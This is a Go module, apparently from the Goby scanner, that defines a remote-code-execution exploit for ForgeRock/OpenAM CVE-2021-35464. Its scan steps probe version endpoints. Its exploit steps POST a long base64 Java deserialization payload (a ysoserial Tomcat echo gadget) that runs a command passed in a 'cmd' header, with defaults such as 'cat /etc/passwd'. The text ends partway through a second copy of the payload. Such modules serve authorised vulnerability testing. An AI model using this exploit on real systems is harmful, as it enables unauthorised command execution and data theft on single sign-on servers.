package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "ForgeRock AM RCE CVE-2021-35464",
  "Description": "Forgerock OpenAM is an open source single sign-on framework from Forgerock, Inc. The framework provides the core identity service (CoreServer) to achieve transparent single sign-on in a network architecture.\\nDue to the use of the JATO framework in the Forgerock AM, this framework was discontinued for maintenance in 2005.The GET request parameter JATO.PageSession is handled in this framework and its value is deserialized directly.Attackers can construct jato. PageSession with a value of malicious serialized data, eventually causing remote code to execute.",
  "Product": "ForgeRock AM",
  "Homepage": "https://www.forgerock.com/blog/tag/openam",
  "DisclosureDate": "2021-07-06",
  "Author": "luckying1314@139.com",
  "GobyQuery": "app=\"OpenAM\"",
  "Level": "3",
  "Impact": "<p><span style=\"color: rgb(74, 144, 226); font-size: 14px;\">Deserialization command execution is mainly due to the application system in dealing with a sequence of bytes by means of reverse sequence not to check the sequence information, an attacker can forge the malicious byte sequences and make application system, application system will be to reverse sequence of the sequence of bytes will perform when submitted by malicious attackers sequence of bytes, which can lead to arbitrary code or command execution,</span><span style=\"font-size: 14px;\">Finally can complete the application system control authority or operating system authority.</span><br></p>",
  "Recommandation": "<p><span style=\"font-size: 14px;\">Verifies deserialized characters</span><br></p>",
  "References": [
    "https://www.pwnwiki.org/index.php?title=CVE-2021-35464_ForgeRock_OpenAM_RCE%E6%BC%8F%E6%B4%9E"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Cmd",
      "type": "createSelect",
      "value": "ls,pwd,cat /etc/passwd",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "GET",
        "uri": "/openam/oauth2/..;/ccversion/Version",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/openam/ccversion/Version",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "OR",
    {
      "Request": {
        "method": "POST",
        "uri": "/openam/oauth2/..;/ccversion/Version",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded",
          "cmd": "{{{Cmd}}}"
        },
        "data_type": "text",
        "data": "jato.pageSession=AKztAAVzcgAXamF2YS51dGlsLlByaW9yaXR5UXVldWWU2jC0-z-CsQMAAkkABHNpemVMAApjb21wYXJhdG9ydAAWTGphdmEvdXRpbC9Db21wYXJhdG9yO3hwAAAAAnNyADBvcmcuYXBhY2hlLmNsaWNrLmNvbnRyb2wuQ29sdW1uJENvbHVtbkNvbXBhcmF0b3IAAAAAAAAAAQIAAkkADWFzY2VuZGluZ1NvcnRMAAZjb2x1bW50ACFMb3JnL2FwYWNoZS9jbGljay9jb250cm9sL0NvbHVtbjt4cAAAAAFzcgAfb3JnLmFwYWNoZS5jbGljay5jb250cm9sLkNvbHVtbgAAAAAAAAABAgATWgAIYXV0b2xpbmtaAAplc2NhcGVIdG1sSQAJbWF4TGVuZ3RoTAAKYXR0cmlidXRlc3QAD0xqYXZhL3V0aWwvTWFwO0wACmNvbXBhcmF0b3JxAH4AAUwACWRhdGFDbGFzc3QAEkxqYXZhL2xhbmcvU3RyaW5nO0wACmRhdGFTdHlsZXNxAH4AB0wACWRlY29yYXRvcnQAJExvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvRGVjb3JhdG9yO0wABmZvcm1hdHEAfgAITAALaGVhZGVyQ2xhc3NxAH4ACEwADGhlYWRlclN0eWxlc3EAfgAHTAALaGVhZGVyVGl0bGVxAH4ACEwADW1lc3NhZ2VGb3JtYXR0ABlMamF2YS90ZXh0L01lc3NhZ2VGb3JtYXQ7TAAEbmFtZXEAfgAITAAIcmVuZGVySWR0ABNMamF2YS9sYW5nL0Jvb2xlYW47TAAIc29ydGFibGVxAH4AC0wABXRhYmxldAAgTG9yZy9hcGFjaGUvY2xpY2svY29udHJvbC9UYWJsZTtMAA10aXRsZVByb3BlcnR5cQB-AAhMAAV3aWR0aHEAfgAIeHAAAQAAAABwcHBwcHBwcHBwdAAQb3V0cHV0UHJvcGVydGllc3Bwc3IAHm9yZy5hcGFjaGUuY2xpY2suY29udHJvbC5UYWJsZQAAAAAAAAABAgAXSQAOYmFubmVyUG9zaXRpb25aAAlob3ZlclJvd3NaABdudWxsaWZ5Um93TGlzdE9uRGVzdHJveUkACnBhZ2VOdW1iZXJJAAhwYWdlU2l6ZUkAE3BhZ2luYXRvckF0dGFjaG1lbnRaAAhyZW5kZXJJZEkACHJvd0NvdW50WgAKc2hvd0Jhbm5lcloACHNvcnRhYmxlWgAGc29ydGVkWgAPc29ydGVkQXNjZW5kaW5nTAAHY2FwdGlvbnEAfgAITAAKY29sdW1uTGlzdHQAEExqYXZhL3V0aWwvTGlzdDtMAAdjb2x1bW5zcQB-AAdMAAtjb250cm9sTGlua3QAJUxvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvQWN0aW9uTGluaztMAAtjb250cm9sTGlzdHEAfgAQTAAMZGF0YVByb3ZpZGVydAAsTG9yZy9hcGFjaGUvY2xpY2svZGF0YXByb3ZpZGVyL0RhdGFQcm92aWRlcjtMAAZoZWlnaHRxAH4ACEwACXBhZ2luYXRvcnQAJUxvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvUmVuZGVyYWJsZTtMAAdyb3dMaXN0cQB-ABBMAAxzb3J0ZWRDb2x1bW5xAH4ACEwABXdpZHRocQB-AAh4cgAob3JnLmFwYWNoZS5jbGljay5jb250cm9sLkFic3RyYWN0Q29udHJvbAAAAAAAAAABAgAJTAAOYWN0aW9uTGlzdGVuZXJ0ACFMb3JnL2FwYWNoZS9jbGljay9BY3Rpb25MaXN0ZW5lcjtMAAphdHRyaWJ1dGVzcQB-AAdMAAliZWhhdmlvcnN0AA9MamF2YS91dGlsL1NldDtMAAxoZWFkRWxlbWVudHNxAH4AEEwACGxpc3RlbmVydAASTGphdmEvbGFuZy9PYmplY3Q7TAAObGlzdGVuZXJNZXRob2RxAH4ACEwABG5hbWVxAH4ACEwABnBhcmVudHEAfgAXTAAGc3R5bGVzcQB-AAd4cHBwcHBwcHBwcAAAAAIAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAXBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHhwcHBwcHBwcHBwdwQAAAADc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAITAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA_____3VyAANbW0JL_RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF_gGCFTgAgAAeHAAABRfyv66vgAAADQBBgoARgCKCgCLAIwKAIsAjQoAHQCOCAB7CgAbAI8KAJAAkQoAkACSBwB8CgCLAJMIAJQKACAAlQgAlggAlwcAmAgAmQgAWQcAmgoAGwCbCACcCABxBwCdCwAWAJ4LABYAnwgAaAgAoAcAoQoAGwCiBwCjCgCkAKUIAKYHAKcIAKgKACAAqQgAqgkAJQCrBwCsCgAlAK0IAK4KAK8AsAoAIACxCACyCACzCAC0CAC1CAC2BwC3BwC4CgAwALkKADAAugoAuwC8CgAvAL0IAL4KAC8AvwoALwDACgAgAMEIAMIKABsAwwoAGwDECADFBwBlCgAbAMYIAMcHAMgIAMkIAMoHAMsKAEMAzAcAzQcAzgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy9Ub21jYXRFY2hvSW5qZWN0OwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwDPAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAA2NscwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNQEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQACW0IBAAlwcm9jZXNzb3IBABJMamF2YS9sYW5nL09iamVjdDsBAANyZXEBAARyZXNwAQABagEAAUkBAAF0AQASTGphdmEvbGFuZy9UaHJlYWQ7AQADc3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQADb2JqAQAKcHJvY2Vzc29ycwEAEExqYXZhL3V0aWwvTGlzdDsBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFpAQAEZmxhZwEAAVoBAAVncm91cAEAF0xqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQABZgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAd0aHJlYWRzAQATW0xqYXZhL2xhbmcvVGhyZWFkOwEADVN0YWNrTWFwVGFibGUHANAHANEHANIHAKcHAKMHAJoHAJ0HAGMHAMgHAMsBAApTb3VyY2VGaWxlAQAVVG9tY2F0RWNob0luamVjdC5qYXZhDABHAEgHANIMANMA1AwA1QDWDADXANgMANkA2gcA0QwA2wDcDADdAN4MAN8A4AEABGV4ZWMMAOEA4gEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAOMA2AEABmdsb2JhbAEADmphdmEvdXRpbC9MaXN0DADkAOUMAN0A5gEAC2dldFJlc3BvbnNlAQAPamF2YS9sYW5nL0NsYXNzDADnAOgBABBqYXZhL2xhbmcvT2JqZWN0BwDpDADqAOsBAAlnZXRIZWFkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQADY21kDADsAO0BAAlzZXRTdGF0dXMMAO4AXwEAEWphdmEvbGFuZy9JbnRlZ2VyDABHAO8BAAdvcy5uYW1lBwDwDADxAPIMAPMA4AEABndpbmRvdwEAB2NtZC5leGUBAAIvYwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABHAPQMAPUA9gcA9wwA-AD5DABHAPoBAAJcQQwA-wD8DAD9AOAMAP4A_wEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawwBAAEBDAECAQMBAAhzZXRCeXRlcwwBBADoAQAHZG9Xcml0ZQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAQUASAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy9Ub21jYXRFY2hvSW5qZWN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAFWphdmEvbGFuZy9UaHJlYWRHcm91cAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAA1nZXRTdXBlcmNsYXNzAQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdpc0VtcHR5AQADKClaAQAEVFlQRQEABChJKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEACGdldEJ5dGVzAQAEKClbQgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQAPcHJpbnRTdGFja1RyYWNlACEARQBGAAAAAAAEAAEARwBIAAEASQAAAC8AAQABAAAABSq3AAGxAAAAAgBKAAAABgABAAAAEQBLAAAADAABAAAABQBMAE0AAAABAE4ATwACAEkAAAA_AAAAAwAAAAGxAAAAAgBKAAAABgABAAAAYABLAAAAIAADAAAAAQBMAE0AAAAAAAEAUABRAAEAAAABAFIAUwACAFQAAAAEAAEAVQABAE4AVgACAEkAAABJAAAABAAAAAGxAAAAAgBKAAAABgABAAAAZgBLAAAAKgAEAAAAAQBMAE0AAAAAAAEAUABRAAEAAAABAFcAWAACAAAAAQBZAFoAAwBUAAAABAABAFUACABbAEgAAQBJAAAF7QAIABEAAAMDAzu4AAK2AANMAU0rtgAEEgW2AAZNLAS2AAcsK7YACMAACcAACU4DNgQVBC2-ogLNLRUEMjoFGQXHAAanArkZBbYACjoGGQYSC7YADJoADRkGEg22AAyaAAanApsZBbYABBIOtgAGTSwEtgAHLBkFtgAIOgcZB8EAD5oABqcCeBkHtgAEEhC2AAZNLAS2AAcsGQe2AAg6BxkHtgAEEhG2AAZNpwAWOggZB7YABLYAE7YAExIRtgAGTSwEtgAHLBkHtgAIOgcZB7YABLYAExIUtgAGTacAEDoIGQe2AAQSFLYABk0sBLYABywZB7YACDoHGQe2AAQSFbYABk0sBLYABywZB7YACMAAFsAAFjoIAzYJFQkZCLkAFwEAogHLGQgVCbkAGAIAOgoZCrYABBIZtgAGTSwEtgAHLBkKtgAIOgsZC7YABBIaA70AG7YAHBkLA70AHbYAHjoMGQu2AAQSHwS9ABtZAxIgU7YAHBkLBL0AHVkDEiFTtgAewAAgOgYZBsYBVxkGtgAimgFPGQy2AAQSIwS9ABtZA7IAJFO2ABwZDAS9AB1ZA7sAJVkRAMi3ACZTtgAeVxInuAAotgApEiq2AAyZABkGvQAgWQMSK1NZBBIsU1kFGQZTpwAWBr0AIFkDEi1TWQQSLlNZBRkGUzoNuwAvWbsAMFkZDbcAMbYAMrYAM7cANBI1tgA2tgA3tgA4Og4SObgAOjoPGQ-2ADs6BxkPEjwGvQAbWQMSPVNZBLIAJFNZBbIAJFO2AD4ZBwa9AB1ZAxkOU1kEuwAlWQO3ACZTWQW7ACVZGQ6-twAmU7YAHlcZDLYABBI_BL0AG1kDGQ9TtgAcGQwEvQAdWQMZB1O2AB5XpwBOOg8SQbgAOjoQGRASQgS9ABtZAxI9U7YAPhkQBL0AHVkDGQ5TtgAeOgcZDLYABBI_BL0AG1kDGRBTtgAcGQwEvQAdWQMZB1O2AB5XBDsamQAGpwAJhAkBp_4vGpkABqcAEacACDoFpwADhAQBp_0ypwAISyq2AESxAAgAlwCiAKUAEgDFANMA1gASAhUCiAKLAEAAMAA7Au8AQwA-AFkC7wBDAFwAfALvAEMAfwLpAu8AQwAAAvoC_QBDAAMASgAAAQYAQQAAABUAAgAWAAkAFwALABgAFQAaABoAGwAmABwAMAAeADYAHwA-ACAARQAhAFwAIgBnACMAbAAkAHQAJQB_ACYAigAnAI8AKACXACoAogAtAKUAKwCnACwAuAAuAL0ALwDFADEA0wA0ANYAMgDYADMA4wA1AOgANgDwADcA-wA4AQAAOQEOADoBHQA7ASgAPAEzAD0BOAA-AUAAPwFZAEABfwBBAYwAQgG3AEMB8gBEAhUARgIcAEcCIwBIAmYASQKIAE4CiwBKAo0ASwKUAEwCtABNAtYATwLYAFEC3wA6AuUAUwLsAFYC7wBUAvEAVQL0ABwC-gBaAv0AWAL-AFkDAgBbAEsAAADeABYApwARAFwAXQAIANgACwBcAF0ACAIcAGwAXgBfAA8ClABCAF4AXwAQAo0ASQBgAGEADwHyAOYAYgBjAA0CFQDDAGQAZQAOASgBtwBmAGcACgFAAZ8AaABnAAsBWQGGAGkAZwAMAREB1ABqAGsACQA2ArYAbABtAAUARQKnAG4AbwAGAHQCeABwAGcABwEOAd4AcQByAAgC8QADAFwAcwAFACkC0QB0AGsABAACAvgAdQB2AAAACQLxAHcAeAABAAsC7wB5AHoAAgAmAtQAewB8AAMC_gAEAFwAcwAAAH0AAACoABf_ACkABQEHAH4HAH8HAAkBAAD8ABQHAID8ABoHAIEC_AAiBwCCZQcAgxJdBwCDDP0ALQcAhAH-AMsHAIIHAIIHAIJSBwCF_wCaAA8BBwB-BwB_BwAJAQcAgAcAgQcAggcAhAEHAIIHAIIHAIIHAIUHAD0AAQcAhvsASvkAAfgABvoABf8ABgAFAQcAfgcAfwcACQEAAEIHAIcE_wAFAAAAAEIHAIcEAAEAiAAAAAIAiXVxAH4AJAAAAdjK_rq-AAAANAAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAAMwABAAEAAAAFKrcAAbEAAAACAA0AAAAKAAIAAACUAAQAlQAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyABRqYXZhLm1hdGguQmlnSW50ZWdlcoz8nx-pO_sdAwAGSQAIYml0Q291bnRJAAliaXRMZW5ndGhJABNmaXJzdE5vbnplcm9CeXRlTnVtSQAMbG93ZXN0U2V0Qml0SQAGc2lnbnVtWwAJbWFnbml0dWRldAACW0J4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHD_______________7____-AAAAAXVxAH4AJAAAAAEBeHg$"
      },
      "SetVariable": [
        "output|lastbody"
      ]
    },
    {
      "Request": {
        "method": "POST",
        "uri": "/openam/ccversion/Version",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded",
          "cmd": "{{{Cmd}}}"
        },
        "data_type": "text",
        "data": "jato.pageSession=AKztAAVzcgAXamF2YS51dGlsLlByaW9yaXR5UXVldWWU2jC0-z-CsQMAAkkABHNpemVMAApjb21wYXJhdG9ydAAWTGphdmEvdXRpbC9Db21wYXJhdG9yO3hwAAAAAnNyADBvcmcuYXBhY2hlLmNsaWNrLmNvbnRyb2wuQ29sdW1uJENvbHVtbkNvbXBhcmF0b3IAAAAAAAAAAQIAAkkADWFzY2VuZGluZ1NvcnRMAAZjb2x1bW50ACFMb3JnL2FwYWNoZS9jbGljay9jb250cm9sL0NvbHVtbjt4cAAAAAFzcgAfb3JnLmFwYWNoZS5jbGljay5jb250cm9sLkNvbHVtbgAAAAAAAAABAgATWgAIYXV0b2xpbmtaAAplc2NhcGVIdG1sSQAJbWF4TGVuZ3RoTAAKYXR0cmlidXRlc3QAD0xqYXZhL3V0aWwvTWFwO0wACmNvbXBhcmF0b3JxAH4AAUwACWRhdGFDbGFzc3QAEkxqYXZhL2xhbmcvU3RyaW5nO0wACmRhdGFTdHlsZXNxAH4AB0wACWRlY29yYXRvcnQAJExvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvRGVjb3JhdG9yO0wABmZvcm1hdHEAfgAITAALaGVhZGVyQ2xhc3NxAH4ACEwADGhlYWRlclN0eWxlc3EAfgAHTAALaGVhZGVyVGl0bGVxAH4ACEwADW1lc3NhZ2VGb3JtYXR0ABlMamF2YS90ZXh0L01lc3NhZ2VGb3JtYXQ7TAAEbmFtZXEAfgAITAAIcmVuZGVySWR0ABNMamF2YS9sYW5nL0Jvb2xlYW47TAAIc29ydGFibGVxAH4AC0wABXRhYmxldAAgTG9yZy9hcGFjaGUvY2xpY2svY29udHJvbC9UYWJsZTtMAA10aXRsZVByb3BlcnR5cQB-AAhMAAV3aWR0aHEAfgAIeHAAAQAAAABwcHBwcHBwcHBwdAAQb3V0cHV0UHJvcGVydGllc3Bwc3IAHm9yZy5hcGFjaGUuY2xpY2suY29udHJvbC5UYWJsZQAAAAAAAAABAgAXSQAOYmFubmVyUG9zaXRpb25aAAlob3ZlclJvd3NaABdudWxsaWZ5Um93TGlzdE9uRGVzdHJveUkACnBhZ2VOdW1iZXJJAAhwYWdlU2l6ZUkAE3BhZ2luYXRvckF0dGFjaG1lbnRaAAhyZW5kZXJJZEkACHJvd0NvdW50WgAKc2hvd0Jhbm5lcloACHNvcnRhYmxlWgAGc29ydGVkWgAPc29ydGVkQXNjZW5kaW5nTAAHY2FwdGlvbnEAfgAITAAKY29sdW1uTGlzdHQAEExqYXZhL3V0aWwvTGlzdDtMAAdjb2x1bW5zcQB-AAdMAAtjb250cm9sTGlua3QAJUxvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvQWN0aW9uTGluaztMAAtjb250cm9sTGlzdHEAfgAQTAAMZGF0YVByb3ZpZGVydAAsTG9yZy9hcGFjaGUvY2xpY2svZGF0YXByb3ZpZGVyL0RhdGFQcm92aWRlcjtMAAZoZWlnaHRxAH4ACEwACXBhZ2luYXRvcnQAJUxvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvUmVuZGVyYWJsZTtMAAdyb3dMaXN0cQB-ABBMAAxzb3J0ZWRDb2x1bW5xAH4ACEwABXdpZHRocQB-AAh4cgAob3JnLmFwYWNoZS5jbGljay5jb250cm9sLkFic3RyYWN0Q29udHJvbAAAAAAAAAABAgAJTAAOYWN0aW9uTGlzdGVuZXJ0ACFMb3JnL2FwYWNoZS9jbGljay9BY3Rpb25MaXN0ZW5lcjtMAAphdHRyaWJ1dGVzcQB-AAdMAAliZWhhdmlvcnN0AA9MamF2YS91dGlsL1NldDtMAAxoZWFkRWxlbWVudHNxAH4AEEwACGxpc3RlbmVydAASTGphdmEvbGFuZy9PYmplY3Q7TAAObGlzdGVuZXJNZXRob2RxAH4ACEwABG5hbWVxAH4ACEwABnBhcmVudHEAfgAXTAAGc3R5bGVzcQB-AAd4cHBwcHBwcHBwcAAAAAIAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAXBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHhwcHBwcHBwcHBwdwQAAAADc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAITAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA_____3VyAANbW0JL_RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF_gGCFTgAgAAeHAAABRfyv66vgAAADQBBgoARgCKCgCLAIwKAIsAjQoAHQCOCAB7CgAbAI8KAJAAkQoAkACSBwB8CgCLAJMIAJQKACAAlQgAlggAlwcAmAgAmQgAWQcAmgoAGwCbCACcCABxBwCdCwAWAJ4LABYAnwgAaAgAoAcAoQoAGwCiBwCjCgCkAKUIAKYHAKcIAKgKACAAqQgAqgkAJQCrBwCsCgAlAK0IAK4KAK8AsAoAIACxCACyCACzCAC0CAC1CAC2BwC3BwC4CgAwALkKADAAugoAuwC8CgAvAL0IAL4KAC8AvwoALwDACgAgAMEIAMIKABsAwwoAGwDECADFBwBlCgAbAMYIAMcHAMgIAMkIAMoHAMsKAEMAzAcAzQcAzgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy9Ub21jYXRFY2hvSW5qZWN0OwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwDPAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF